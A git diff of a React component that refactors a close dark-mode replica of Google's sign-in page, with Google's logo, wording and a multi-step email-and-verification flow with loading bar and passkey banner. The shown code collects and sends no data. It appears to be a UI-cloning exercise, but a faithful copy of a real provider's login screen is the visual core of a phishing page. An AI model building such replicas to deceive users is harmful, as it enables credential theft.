@@ -1,200 +1,57 @@
-import React, { useState, useEffect, useRef } from "react";
-
-const languages = [
-  "Afrikaans",
-  "azərbaycan",
-  "bosanski",
-  "català",
-  "Čeština",
-  "Cymraeg",
-  "Dansk",
-  "Deutsch",
-  "eesti",
-  "English (United Kingdom)",
-  "English (United States)",
-  "Español (España)",
-  "Español (Latinoamérica)",
-  "Français",
-];
+import React, { useState } from "react";
+import LeftSide from "./components/LeftSide";
+import RightSide from "./components/RightSide";
+import Footer from "./components/Footer";
 
 const GoogleSignInTemplate = () => {
-  const [email, setEmail] = useState("");
-  const [isFocused, setIsFocused] = useState(false);
-  const [error, setError] = useState(false);
-
-  // Dropdown States
-  const [showDropdown, setShowDropdown] = useState(false);
-  const [selectedLang, setSelectedLang] = useState("English (United States)");
-  const dropdownRef = useRef(null);
-
-  // Close dropdown when clicking outside
-  useEffect(() => {
-    const handleClickOutside = (event) => {
-      if (dropdownRef.current && !dropdownRef.current.contains(event.target)) {
-        setShowDropdown(false);
-      }
-    };
-    document.addEventListener("mousedown", handleClickOutside);
-    return () => document.removeEventListener("mousedown", handleClickOutside);
-  }, []);
-
-  const handleSubmit = (e) => {
-    e.preventDefault();
-
-    if (!email.trim()) {
-      setError(true);
-      return;
-    }
-
-    setError(false);
-    console.log("Submitted Email:", email);
-  };
+  const [step, setStep] = useState(1);
+  const [userEmail, setUserEmail] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
 
   return (
     <>
+      {isLoading && <div className="screen-overlay"></div>}
+
       <div className="google-page">
         <div className="signin-card">
-          {/* LEFT SIDE */}
-          <div className="left-side">
-            <div className="google-logo">
-              <svg viewBox="0 0 48 48">
-                <path
-                  fill="#EA4335"
-                  d="M24 9.5c3.54 0 6.7 1.22 9.2 3.6l6.85-6.85C35.9 2.38 30.4 0 24 0 14.64 0 6.57 5.38 2.62 13.22l7.98 6.19C12.43 13.74 17.74 9.5 24 9.5z"
-                />
-                <path
-                  fill="#4285F4"
-                  d="M46.5 24.5c0-1.64-.14-3.21-.4-4.73H24v8.96h12.7c-.55 2.96-2.23 5.46-4.73 7.14l7.65 5.93C44.1 37.66 46.5 31.68 46.5 24.5z"
-                />
-                <path
-                  fill="#FBBC05"
-                  d="M10.6 28.59a14.5 14.5 0 010-9.18l-7.98-6.19A23.96 23.96 0 000 24c0 3.84.92 7.48 2.62 10.78l7.98-6.19z"
-                />
-                <path
-                  fill="#34A853"
-                  d="M24 48c6.48 0 11.92-2.14 15.9-5.82l-7.65-5.93c-2.13 1.43-4.86 2.25-8.25 2.25-6.26 0-11.57-4.24-13.4-9.91l-7.98 6.19C6.57 42.62 14.64 48 24 48z"
-                />
-              </svg>
-            </div>
+          {isLoading && <div className="loading-bar"></div>}
 
-            <h1>Sign in</h1>
-
-            <p>
-              with your Google Account. This account will be available to other
-              Google apps in the browser.
-            </p>
-          </div>
-
-          {/* RIGHT SIDE */}
-          <div className="right-side">
-            <form onSubmit={handleSubmit}>
-              <div
-                className={`input-box ${
-                  isFocused || email ? "focused" : ""
-                } ${error ? "error" : ""}`}
-              >
-                <input
-                  type="text"
-                  value={email}
-                  onFocus={() => setIsFocused(true)}
-                  onBlur={() => setIsFocused(false)}
-                  onChange={(e) => {
-                    setEmail(e.target.value);
-                    if (error) setError(false);
-                  }}
-                />
-
-                <label>Email or phone</label>
-              </div>
-
-              {error && (
-                <div className="error-text">
-                  <svg viewBox="0 0 24 24">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
-                  </svg>
-                  <span>Enter an email or phone number</span>
-                </div>
-              )}
-
-              <a href="/" className="forgot-link">
-                Forgot email?
-              </a>
-
-              <p className="guest-text">
-                Not your computer? Use Guest mode to sign in privately.
-                <a href="/"> Learn more about using Guest mode</a>
-              </p>
-
-              <div className="bottom-buttons">
-                <button type="button" className="create-btn">
-                  Create account
-                </button>
-
-                <button type="submit" className="next-btn">
-                  Next
-                </button>
-              </div>
-            </form>
-          </div>
+          <LeftSide step={step} email={userEmail} />
+          <RightSide
+            step={step}
+            setStep={setStep}
+            email={userEmail}
+            setEmail={setUserEmail}
+            setIsLoading={setIsLoading}
+            isLoading={isLoading}
+          />
         </div>
 
-        {/* FOOTER */}
-        <div className="footer">
-          <div className="lang-dropdown-container" ref={dropdownRef}>
-            <div
-              className={`dropdown-trigger ${showDropdown ? "active" : ""}`}
-              onClick={() => setShowDropdown(!showDropdown)}
-            >
-              <span>{selectedLang}</span>
-              <svg
-                width="18"
-                height="18"
-                viewBox="0 0 24 24"
-                fill="currentColor"
-              >
-                <path d="M7 10l5 5 5-5z"></path>
-              </svg>
-            </div>
-
-            {showDropdown && (
-              <div className="custom-dropdown-menu">
-                <ul>
-                  {languages.map((lang) => (
-                    <li
-                      key={lang}
-                      className={selectedLang === lang ? "selected" : ""}
-                      onClick={() => {
-                        setSelectedLang(lang);
-                        setShowDropdown(false);
-                      }}
-                    >
-                      {lang}
-                    </li>
-                  ))}
-                </ul>
-              </div>
-            )}
-          </div>
-
-          <div className="footer-links">
-            <a href="/">Help</a>
-            <a href="/">Privacy</a>
-            <a href="/">Terms</a>
-          </div>
-        </div>
+        <Footer />
       </div>
 
       <style>{`
+        @import url('https://fonts.cdnfonts.com/css/google-sans?fonts=google-sans-regular,google-sans-light');
+
+        .screen-overlay {
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100vw;
+          height: 100vh;
+          background: rgba(0, 0, 0, 0.4); 
+          z-index: 9999; 
+        }
+
         *{
           margin:0;
           padding:0;
           box-sizing:border-box;
+          font-family: "Google Sans", "Product Sans", Roboto, Arial, sans-serif;
+          font-weight: 400; 
         }
 
-        body{
-          font-family: "Google Sans",Roboto,Arial,sans-serif;
-          background: #1f1f1f;
-        }
+        body{ background: #1f1f1f; }
 
         .google-page{
           width:100%;
@@ -208,6 +65,7 @@ const GoogleSignInTemplate = () => {
         }
 
         .signin-card{
+          position: relative; 
           width:100%;
           max-width:1140px;
           background:#0e0e0e;
@@ -215,6 +73,36 @@ const GoogleSignInTemplate = () => {
           display:flex;
           justify-content:space-between;
           padding: 32px 40px; 
+          transform: translateY(-2%);
+        }
+
+        /* LOADING BAR */
+        .loading-bar {
+          position: absolute;
+          top: 0;
+          left: 28px; 
+          width: calc(100% - 56px); 
+          height: 4px;
+          background-color: rgba(168, 199, 250, 0.12); 
+          overflow: hidden;
+          z-index: 10;
+        }
+
+        .loading-bar::before {
+          content: '';
+          position: absolute;
+          top: 0;
+          left: -50%;
+          height: 100%;
+          width: 50%;
+          background-color: #a8c7fa; 
+          animation: google-loader 1.5s infinite ease-in-out;
+        }
+
+        @keyframes google-loader {
+          0% { left: -50%; width: 30%; }
+          50% { left: 20%; width: 80%; }
+          100% { left: 100%; width: 30%; }
         }
 
         .left-side{
@@ -224,22 +112,15 @@ const GoogleSignInTemplate = () => {
           padding-right: 16px;
         }
 
-        .google-logo {
-          margin-top: 10px; /* Added to move logo and left content down slightly */
-        }
-
-        .google-logo svg{
-          width:40px;
-          height:40px;
-        }
+        .google-logo { margin-top: 10px; }
+        .google-logo svg{ width:40px; height:40px; }
 
         .left-side h1{
           color:#fff;
           font-size:36px; 
-          font-weight:400;
+          font-weight:300; 
           margin-top:28px;
           letter-spacing: -0.5px;
-          font-family: sans-serif; 
         }
 
         .left-side p{
@@ -247,10 +128,26 @@ const GoogleSignInTemplate = () => {
           font-size:16px; 
           line-height:26px;
           margin-top:20px;
-          max-width:440px;
-          font-weight:400;
-          font-family: "Google Sans", sans-serif; 
+          max-width:480px; 
+          transform: translateY(-7%);
         }
+
+        .profile-pill {
+          display: inline-flex;
+          align-items: center;
+          gap: 8px;
+          border: 1px solid #747775;
+          border-radius: 32px;
+          padding: 6px 12px 6px 6px;
+          margin-top: 16px;
+          cursor: pointer;
+          transition: background 0.2s;
+          width: fit-content;
+        }
+        .profile-pill:hover { background: rgba(255, 255, 255, 0.04); }
+        .profile-icon { width: 20px; height: 20px; color: #c4c7c5; }
+        .profile-email { color: #e3e3e3; font-size: 14px; font-weight: 500; }
+        .profile-arrow { width: 16px; height: 16px; color: #c4c7c5; }
 
         .right-side{
           width:50%;
@@ -260,18 +157,50 @@ const GoogleSignInTemplate = () => {
           padding-top:56px; 
         }
 
+        .slide-in-right {
+          animation: slideInRight 0.4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+
+        @keyframes slideInRight {
+          from {
+            opacity: 0;
+            transform: translateX(40px);
+          }
+          to {
+            opacity: 1;
+            transform: translateX(0);
+          }
+        }
+
         .right-side form{
           width:100%;
           max-width:500px; 
           display:flex;
           flex-direction:column;
-          margin-top: 16px; /* Added to move input field and right content down without adding padding to container */
+          margin-top: 16px;
+          position: relative;
+          left: 20px;
         }
+
+        .passkey-banner {
+          background-color: #0842a0;
+          border-radius: 8px;
+          padding: 16px;
+          display: flex;
+          align-items: flex-start;
+          gap: 16px;
+          margin-bottom: 24px;
+        }
+        .passkey-icon { width: 20px; height: 20px; fill: #fff; flex-shrink: 0; margin-top: 2px;}
+        .passkey-text { color: #fff; font-size: 14px; line-height: 20px; }
+
+        .verify-text { color: #e3e3e3; font-size: 16px; margin-bottom: 20px; }
 
         .input-box{
           width:100%;
           height:56px; 
           position:relative;
+          top: 15px;
         }
 
         .input-box input{
@@ -287,7 +216,6 @@ const GoogleSignInTemplate = () => {
           transition:0.2s ease-in-out;
         }
 
-        /* AUTOFILL FIX */
         input:-webkit-autofill,
         input:-webkit-autofill:hover, 
         input:-webkit-autofill:focus, 
@@ -310,69 +238,111 @@ const GoogleSignInTemplate = () => {
           pointer-events:none;
         }
 
-        .input-box.focused label{
-          top:0;
-          font-size:13px;
-          color:#8ab4f8;
-        }
-
-        .input-box.focused input{
-          border:2px solid #8ab4f8;
-        }
-
-        .input-box.error input{
-          border:2px solid #f28b82;
-        }
-
-        .input-box.error label{
-          color:#f28b82;
-        }
+        .input-box.focused label{ top:0; font-size:13px; color:#a8c7fa; }
+        .input-box.focused input{ border:2px solid #a8c7fa; }
+        .input-box.error input{ border:2px solid #f28b82 !important; }
+        .input-box.error label{ color:#f28b82 !important; }
 
         .error-text{
           display:flex;
           align-items:center;
           gap:8px;
           color:#f28b82;
-          margin-top:10px;
+          margin-top:22px; 
           font-size:13px;
+          width: 100%;
         }
 
-        .error-text svg{
-          width:18px;
-          height:18px;
-          fill:#f28b82;
+        .error-icon{ width:16px; height:16px; fill:#f28b82; flex-shrink: 0; }
+
+        .checkbox-container {
+          display: flex;
+          align-items: center;
+          gap: 16px;
+          margin-top: 24px;
+          cursor: pointer;
+          width: fit-content;
+          position: relative;
         }
+
+        .custom-checkbox-input {
+          position: absolute;
+          opacity: 0;
+          cursor: pointer;
+          height: 0;
+          width: 0;
+        }
+
+        .custom-checkbox {
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          width: 18px;
+          height: 18px;
+          border: 2px solid #c4c7c5;
+          border-radius: 2px;
+          transition: all 0.2s ease-in-out;
+          position: relative;
+          z-index: 2;
+        }
+
+        .custom-checkbox::before {
+          content: "";
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          width: 40px;
+          height: 40px;
+          border-radius: 50%;
+          background: rgba(255, 255, 255, 0);
+          transition: background 0.2s;
+          z-index: -1;
+        }
+
+        .checkbox-container:hover .custom-checkbox {
+          border-color: #e3e3e3;
+        }
+
+        .checkbox-container:hover .custom-checkbox::before {
+          background: rgba(255, 255, 255, 0.08);
+        }
+
+        .custom-checkbox-input:checked ~ .custom-checkbox {
+          background-color: #a8c7fa;
+          border-color: #a8c7fa;
+        }
+
+        .checkmark {
+          fill: #0e0e0e;
+          width: 14px;
+          height: 14px;
+          opacity: 0;
+          transition: opacity 0.2s ease-in-out;
+        }
+
+        .custom-checkbox-input:checked ~ .custom-checkbox .checkmark {
+          opacity: 1;
+        }
+
+        .checkbox-label { color: #e3e3e3; font-size: 14px; }
 
         .forgot-link{
-          margin-top:14px;
-          color:#8ab4f8;
-          text-decoration:none;
-          font-size:15px;
-          font-weight:500;
-          width:fit-content;
+          margin-top: 26px; 
+          color: #a8c7fa;
+          text-decoration: none;
+          font-size: 15px;
+          width: fit-content;
+          padding: 2px 8px; 
+          border-radius: 100px; 
+          transition: 0.2s;
+          margin-left: -8px;
         }
+        .forgot-link:hover{ background: rgba(255, 255, 255, 0.05); }
 
-        .forgot-link:hover{
-          text-decoration:underline;
-        }
-
-        .guest-text{
-          margin-top:56px;
-          margin-left: 12px; 
-          color:#c7c7c7;
-          font-size:15px;
-          line-height:24px;
-        }
-
-        .guest-text a{
-          color:#8ab4f8;
-          text-decoration:none;
-          font-weight:500;
-        }
-
-        .guest-text a:hover {
-          text-decoration: underline;
-        }
+        .guest-text{ margin-top: 28px; color:#c7c7c7; font-size:15px; line-height:24px; }
+        .guest-text a{ color: #a8c7fa; text-decoration:none; }
+        .guest-text a:hover { text-decoration: underline; }
 
         .bottom-buttons{
           margin-top: 36px; 
@@ -382,184 +352,114 @@ const GoogleSignInTemplate = () => {
           gap:16px;
         }
 
+        .try-another-way {
+          background: transparent;
+          border: none;
+          color: #a8c7fa;
+          font-size: 14px;
+          font-weight: 500;
+          cursor: pointer;
+          padding: 9px 16px;
+          border-radius: 50px;
+          transition: 0.2s;
+        }
+        .try-another-way:hover { background: rgba(168, 199, 250, .08); }
+
+        .create-account-wrapper { position: relative; }
+
         .create-btn{
           background:transparent;
           border:none;
-          color:#8ab4f8;
+          color: #a8c7fa;
           font-size:15px;
-          font-weight:500;
           cursor:pointer;
-          padding:12px 18px;
+          padding:9px 16px; 
           border-radius:50px;
           transition: 0.2s;
         }
+        .create-btn:hover, .create-btn.active { background:rgba(168, 199, 250, .08); }
 
-        .create-btn:hover{
-          background:rgba(138,180,248,.08);
+        .create-menu {
+          position: absolute;
+          top: calc(100% + 4px); 
+          left: 0;
+          background: #303134; 
+          border-radius: 12px;
+          width: max-content; 
+          min-width: 200px; 
+          box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+          z-index: 20;
+          padding: 8px 0;
         }
+        .create-menu ul { list-style: none; }
+        .create-menu li {
+          padding: 12px 16px; 
+          color: #e8eaed;
+          font-size: 14px;
+          cursor: pointer;
+          transition: background 0.2s;
+        }
+        .create-menu li:hover { background: rgba(255, 255, 255, 0.04); }
 
         .next-btn{
-          background:#8ab4f8;
+          background: #a8c7fa;
           border:none;
           color:#062e6f;
           height:44px;
           padding:0 28px;
           border-radius:999px;
           font-size:15px;
-          font-weight:500;
           cursor:pointer;
           transition: 0.2s;
         }
-        
-        .next-btn:hover {
-          background: #a8c7fa;
-        }
+        .next-btn:hover { background: #b9d3fb; }
 
-        .footer{
-          width:100%;
-          max-width:1140px;
-          display:flex;
-          justify-content:space-between;
-          align-items:center;
-          margin-top:20px;
-          padding:0 8px;
-        }
+        .footer{ width:100%; max-width:1140px; display:flex; justify-content:space-between; align-items:center; margin-top: 4px; padding:0 8px; }
+        .lang-dropdown-container { position: relative; left: 16px; }
+        .dropdown-trigger { display: flex; align-items: center; gap: 6px; color: #c7c7c7; font-size: 13px; cursor: pointer; padding: 6px 10px; border-radius: 4px; transition: background 0.2s; margin-left: -10px; }
+        .dropdown-trigger:hover, .dropdown-trigger.active { background: rgba(255, 255, 255, 0.05); }
+        .custom-dropdown-menu { position: absolute; bottom: 100%; left: 0; background: #303134; border-radius: 8px; width: 250px; max-height: 350px; overflow-y: auto; box-shadow: 0 4px 12px rgba(0,0,0,0.5); z-index: 10; margin-bottom: 8px; padding: 8px 0; }
+        .custom-dropdown-menu ul { list-style: none; }
+        .custom-dropdown-menu li { padding: 12px 24px; color: #e8eaed; font-size: 14px; cursor: pointer; transition: background 0.2s; }
+        .custom-dropdown-menu li:hover { background: rgba(255, 255, 255, 0.04); }
+        .footer-links{ display:flex; gap:12px; }
+        .footer-links a{ color:#c7c7c7; text-decoration:none; font-size:13px; transition: 0.2s; padding: 6px 10px; border-radius: 4px; }
+        .footer-links a:hover{ background: rgba(255, 255, 255, 0.05); }
 
-        /* CUSTOM DROPDOWN CSS */
-        .lang-dropdown-container {
-          position: relative;
-        }
-
-        .dropdown-trigger {
-          display: flex;
-          align-items: center;
-          gap: 6px;
-          color: #c7c7c7;
-          font-size: 13px;
-          cursor: pointer;
-          padding: 6px 10px;
-          border-radius: 4px;
-          transition: background 0.2s;
-          margin-left: -10px;
-        }
-
-        .dropdown-trigger:hover, .dropdown-trigger.active {
-          background: rgba(255, 255, 255, 0.05);
-        }
-
-        .custom-dropdown-menu {
-          position: absolute;
-          bottom: 100%;
-          left: 0;
-          background: #303134;
-          border-radius: 8px;
-          width: 250px;
-          max-height: 350px;
-          overflow-y: auto;
-          box-shadow: 0 4px 12px rgba(0,0,0,0.5);
-          z-index: 10;
-          margin-bottom: 8px;
-          padding: 8px 0;
-        }
-
-        .custom-dropdown-menu::-webkit-scrollbar {
-          width: 8px;
-        }
-        .custom-dropdown-menu::-webkit-scrollbar-track {
-          background: transparent;
-        }
-        .custom-dropdown-menu::-webkit-scrollbar-thumb {
-          background: #5f6368;
-          border-radius: 10px;
-          border: 2px solid #303134;
-        }
-        .custom-dropdown-menu::-webkit-scrollbar-thumb:hover {
-          background: #9aa0a6;
-        }
-
-        .custom-dropdown-menu ul {
-          list-style: none;
-        }
-
-        .custom-dropdown-menu li {
-          padding: 12px 24px;
-          color: #e8eaed;
-          font-size: 14px;
-          cursor: pointer;
-          transition: background 0.2s;
-        }
-
-        .custom-dropdown-menu li:hover {
-          background: rgba(255, 255, 255, 0.04);
-        }
-
-        .custom-dropdown-menu li.selected {
-          background: #474a4d;
-          color: #fff;
-        }
-
-        .footer-links{
-          display:flex;
-          gap:12px; 
-        }
-
-        .footer-links a{
-          color:#c7c7c7;
-          text-decoration:none;
-          font-size:13px;
-          transition: 0.2s;
-          padding: 6px 10px;
-          border-radius: 4px;
-        }
-
-        .footer-links a:hover{
-          background: rgba(255, 255, 255, 0.05);
-        }
-
+        /* TABLET STYLES (UNTOUCHED) */
         @media(max-width:900px){
-          .signin-card{
-            flex-direction:column;
-            padding:32px;
-          }
-
-          .left-side{
-            width:100%;
-            padding-right: 0;
-          }
-
-          .right-side{
-            width:100%;
-            padding-top:40px;
-            justify-content: flex-start;
-          }
-
-          .right-side form {
-            max-width: 100%;
-          }
-
-          .left-side h1{
-            font-size:32px;
-          }
+          .signin-card{ flex-direction:column; padding:32px; transform: none; }
+          .left-side{ width:100%; padding-right: 0; }
+          .right-side{ width:100%; padding-top:40px; justify-content: flex-start; }
+          .right-side form { max-width: 100%; left: 0; }
+          .left-side h1{ font-size:32px; }
+          .loading-bar { left: 32px; width: calc(100% - 64px); }
         }
 
+        /* NEW MOBILE STYLES (SIRF MOBILE KE LIYE FIX KIYA HAI) */
         @media(max-width:600px){
-          .google-page{
-            padding:0;
-            background:#0e0e0e;
-            justify-content: flex-start;
+          .google-page { 
+            padding: 0; 
+            background: #0e0e0e; 
+            justify-content: space-between; /* Card ko top pe aur footer ko bottom pe karega */
+            min-height: 100vh; 
           }
-
-          .signin-card{
-            border-radius:0;
-            padding:24px;
+          .signin-card { 
+            border-radius: 0; 
+            padding: 36px 24px; 
+            flex: 1; /* Poori height lene ke liye */
+            justify-content: flex-start; 
           }
-
-          .footer{
-            padding:20px 24px;
-            flex-direction: column;
-            gap: 16px;
-            align-items: flex-start;
+          .footer { 
+            padding: 16px 24px; 
+            flex-direction: row; /* Ek line me arrange karne ke liye */
+            flex-wrap: wrap; /* Agar screen choti ho to nicely neechay aajaye */
+            justify-content: space-between; 
+            align-items: center; 
+            gap: 12px; 
           }
+          .loading-bar { left: 0; width: 100%; }
+          .right-side { padding-top: 32px; }
         }
       `}</style>
     </>
